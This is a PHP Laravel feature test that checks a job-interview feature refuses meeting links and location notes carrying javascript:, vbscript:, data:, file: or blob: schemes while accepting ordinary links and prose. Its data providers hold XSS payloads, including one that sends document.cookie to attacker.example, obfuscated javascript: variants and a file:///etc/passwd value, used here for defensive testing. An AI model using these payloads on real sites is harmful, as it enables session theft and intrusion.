<?php
// Copyright © 2024–2026 Jasper Ford
// SPDX-License-Identifier: AGPL-3.0-or-later
// Author: Jasper Ford
// See NOTICE file for attribution and acknowledgements.

declare(strict_types=1);

namespace Tests\Laravel\Feature\Security;

use App\Core\TenantContext;
use App\Models\JobVacancy;
use App\Models\User;
use App\Services\JobInterviewSchedulingService;
use App\Services\JobInterviewService;
use App\Services\SafeguardingInteractionPolicy;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\DB;
use Laravel\Sanctum\Sanctum;
use Mockery;
use Tests\Laravel\TestCase;

/**
 * F-297 — two job-interview fields reach an applicant's screen as a link:
 *
 *  - `job_interview_slots.meeting_link` ("Join call") must be an http(s) URL;
 *  - `job_interviews.location_notes` is free prose ("Room 3", "Teams link to
 *    follow"), but for a video interview with no meeting link the applicant's
 *    card renders it as a link, so a value carrying a script-running or
 *    local-content scheme (javascript:, vbscript:, data:, file:, blob:) is
 *    refused. Ordinary prose and app links (zoommtg:, msteams:) still store.
 */
final class JobInterviewLinkSchemeTest extends TestCase
{
    use DatabaseTransactions;

    protected function setUp(): void
    {
        parent::setUp();
        TenantContext::setById($this->testTenantId);

        // The safeguarding contact gate is community-configuration dependent
        // and not the property under test.
        $policy = Mockery::mock(SafeguardingInteractionPolicy::class);
        $policy->shouldReceive('assertLocalContactAllowed')->andReturnNull();
        $policy->shouldIgnoreMissing();
        $this->app->instance(SafeguardingInteractionPolicy::class, $policy);
    }

    private function makeUser(): User
    {
        return User::factory()->forTenant($this->testTenantId)->create([
            'status' => 'active',
            'is_approved' => true,
        ]);
    }

    private function makeVacancy(User $owner): int
    {
        return (int) JobVacancy::factory()->forTenant($this->testTenantId)->create([
            'user_id' => $owner->id,
            'status' => 'open',
        ])->id;
    }

    private function makeApplication(int $vacancyId, User $candidate): int
    {
        return (int) DB::table('job_vacancy_applications')->insertGetId([
            'tenant_id'  => $this->testTenantId,
            'vacancy_id' => $vacancyId,
            'user_id'    => $candidate->id,
            'status'     => 'applied',
            'stage'      => 'applied',
            'created_at' => now(),
            'updated_at' => now(),
        ]);
    }

    /** @return array<string, mixed> */
    private function slot(string $meetingLink, int $days = 3): array
    {
        return [
            'start' => now()->addDays($days)->format('Y-m-d H:i:s'),
            'end' => now()->addDays($days)->addHour()->format('Y-m-d H:i:s'),
            'type' => 'video',
            'meeting_link' => $meetingLink,
        ];
    }

    // ── meeting_link ─────────────────────────────────────────────────

    /** @return array<string, array{string}> */
    public static function refusedMeetingLinks(): array
    {
        return [
            'javascript'    => ['javascript:fetch("https://attacker.example/"+document.cookie)'],
            'mixed case'    => ['JavaScript:alert(1)'],
            'data uri'      => ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
            'file'          => ['file:///etc/passwd'],
            'no scheme'     => ['meet.example.org/room'],
        ];
    }

    /**
     * @dataProvider refusedMeetingLinks
     */
    public function test_a_non_web_meeting_link_is_refused_and_no_slot_is_stored(string $link): void
    {
        $employer = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);

        $svc = app(JobInterviewSchedulingService::class);
        $created = $svc->createSlots($vacancyId, (int) $employer->id, [
            $this->slot('https://meet.jit.si/legitimate-first-slot'),
            $this->slot($link, 4),
        ], $this->testTenantId);

        $this->assertSame([], $created);
        $this->assertSame('VALIDATION_INVALID_URL', $svc->getErrors()[0]['code'] ?? null);
        $this->assertSame('meeting_link', $svc->getErrors()[0]['field'] ?? null);
        $this->assertSame(
            0,
            DB::table('job_interview_slots')->where('job_id', $vacancyId)->count(),
            'no slot of a refused batch may be stored',
        );
    }

    public function test_the_slot_endpoint_answers_422_for_a_javascript_meeting_link(): void
    {
        $employer = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);
        Sanctum::actingAs($employer, ['*']);

        $response = $this->apiPost("/v2/jobs/{$vacancyId}/interview-slots", [
            'slots' => [$this->slot('javascript:alert(1)')],
        ]);

        $this->assertSame(422, $response->status(), $response->getContent());
        $this->assertSame(0, DB::table('job_interview_slots')->where('job_id', $vacancyId)->count());
    }

    public function test_control_a_web_meeting_link_is_stored_and_reaches_the_applicant(): void
    {
        $employer = $this->makeUser();
        $candidate = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);
        $this->makeApplication($vacancyId, $candidate);

        $svc = app(JobInterviewSchedulingService::class);
        $created = $svc->createSlots($vacancyId, (int) $employer->id, [
            $this->slot('https://zoom.us/j/123?pwd=abc'),
        ], $this->testTenantId);

        $this->assertCount(1, $created, json_encode($svc->getErrors()) ?: '');
        $booked = $svc->bookSlot((int) $created[0]['id'], (int) $candidate->id, $this->testTenantId);
        $this->assertIsArray($booked);
        $this->assertSame('https://zoom.us/j/123?pwd=abc', $booked['meeting_link'] ?? null);
    }

    public function test_control_the_endpoint_still_creates_a_slot_with_a_web_link(): void
    {
        $employer = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);
        Sanctum::actingAs($employer, ['*']);

        $response = $this->apiPost("/v2/jobs/{$vacancyId}/interview-slots", [
            'slots' => [$this->slot('https://meet.jit.si/f297-control')],
        ]);

        $this->assertSame(201, $response->status(), $response->getContent());
        $this->assertSame(
            'https://meet.jit.si/f297-control',
            DB::table('job_interview_slots')->where('job_id', $vacancyId)->value('meeting_link'),
        );
    }

    public function test_control_a_video_slot_with_no_link_still_gets_a_generated_one(): void
    {
        $employer = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);

        $svc = app(JobInterviewSchedulingService::class);
        $created = $svc->createSlots($vacancyId, (int) $employer->id, [
            $this->slot(''),
        ], $this->testTenantId);

        $this->assertCount(1, $created);
        $this->assertStringStartsWith('https://meet.jit.si/nexus-interview-', (string) $created[0]['meeting_link']);
    }

    // ── location_notes ───────────────────────────────────────────────

    /** @return array<string, array{string}> */
    public static function refusedLocationNotes(): array
    {
        return [
            'javascript'          => ['javascript:fetch("https://attacker.example/"+document.cookie)'],
            'javascript tabbed'   => ["java\tscript:alert(1)"],
            'leading whitespace'  => ["  \n JAVASCRIPT:alert(1)"],
            'vbscript'            => ['vbscript:msgbox(1)'],
            'data uri'            => ['data:text/html,<script>alert(1)</script>'],
            'file'                => ['file:///etc/passwd'],
            'blob'                => ['blob:https://attacker.example/1234'],
        ];
    }

    /**
     * @dataProvider refusedLocationNotes
     */
    public function test_location_notes_carrying_a_script_or_local_scheme_is_refused(string $notes): void
    {
        $employer = $this->makeUser();
        $candidate = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);
        $applicationId = $this->makeApplication($vacancyId, $candidate);

        $result = JobInterviewService::propose($applicationId, (int) $employer->id, [
            'interview_type' => 'video',
            'scheduled_at' => now()->addDays(2)->format('Y-m-d H:i:s'),
            'duration_mins' => 30,
            'location_notes' => $notes,
        ]);

        $this->assertFalse($result);
        $this->assertSame(0, DB::table('job_interviews')->where('application_id', $applicationId)->count());
    }

    public function test_the_propose_endpoint_answers_422_for_javascript_location_notes(): void
    {
        $employer = $this->makeUser();
        $candidate = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);
        $applicationId = $this->makeApplication($vacancyId, $candidate);
        Sanctum::actingAs($employer, ['*']);

        $response = $this->apiPost("/v2/jobs/applications/{$applicationId}/interview", [
            'interview_type' => 'video',
            'scheduled_at' => now()->addDays(2)->format('Y-m-d H:i:s'),
            'duration_mins' => 30,
            'location_notes' => 'javascript:alert(1)',
        ]);

        $this->assertSame(422, $response->status(), $response->getContent());
        $this->assertSame(0, DB::table('job_interviews')->where('application_id', $applicationId)->count());
    }

    /** @return array<string, array{string, string}> */
    public static function acceptedLocationNotes(): array
    {
        return [
            'web link'             => ['video', 'https://meet.jit.si/f297-location-control'],
            'app link'             => ['video', 'zoommtg://zoom.us/join?confno=123'],
            'prose with colon'     => ['video', 'Teams: link to follow by email'],
            'in person prose'      => ['in_person', 'Room 3, second floor. Ask at reception: bring ID.'],
            'prose naming scheme'  => ['phone', 'We will not use javascript: we will just call you'],
        ];
    }

    /**
     * Legitimate-access control: prose and real links still store unchanged.
     *
     * @dataProvider acceptedLocationNotes
     */
    public function test_control_ordinary_location_notes_are_stored_unchanged(string $type, string $notes): void
    {
        $employer = $this->makeUser();
        $candidate = $this->makeUser();
        $vacancyId = $this->makeVacancy($employer);
        $applicationId = $this->makeApplication($vacancyId, $candidate);

        $result = JobInterviewService::propose($applicationId, (int) $employer->id, [
            'interview_type' => $type,
            'scheduled_at' => now()->addDays(2)->format('Y-m-d H:i:s'),
            'duration_mins' => 30,
            'location_notes' => $notes,
        ]);

        $this->assertIsArray($result);
        $this->assertSame(
            $notes,
            DB::table('job_interviews')->where('id', (int) $result['id'])->value('location_notes'),
        );
    }
}
